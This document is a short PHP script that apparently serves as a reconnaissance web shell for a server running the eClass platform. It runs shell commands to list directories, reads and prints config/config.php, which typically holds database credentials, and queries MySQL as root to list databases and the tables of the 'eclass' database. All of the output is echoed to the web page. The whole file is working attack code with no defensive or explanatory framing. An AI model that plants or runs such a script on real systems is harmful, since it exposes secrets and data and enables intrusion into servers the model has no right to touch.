<?php
$pwd = shell_exec('pwd');
$ls1 = shell_exec('ls -la');
$ls2 = shell_exec('ls .. -la');
$ls3 = shell_exec('ls config -la');
$ls3 = htmlentities(file_get_contents("config/config.php"));

/* if mysql exists */
$sql1 = shell_exec('echo "show databases;" | mysql -u root --password=""');
$sql2 = shell_exec('echo "use eclass; show tables;" | mysql -u root --password=');

if ($sql1 == "") {
    /* if lammp */
    $sql1 = shell_exec('echo "show databases;" | ../../bin/mysql -u root');
    $sql2 = shell_exec('echo "use eclass; show tables;" | ../../bin/mysql  -u root');
}

echo "<pre>
$pwd 
$ls1 
$ls2 
$ls3 
$sql1 
$sql2 
</pre>";
?>
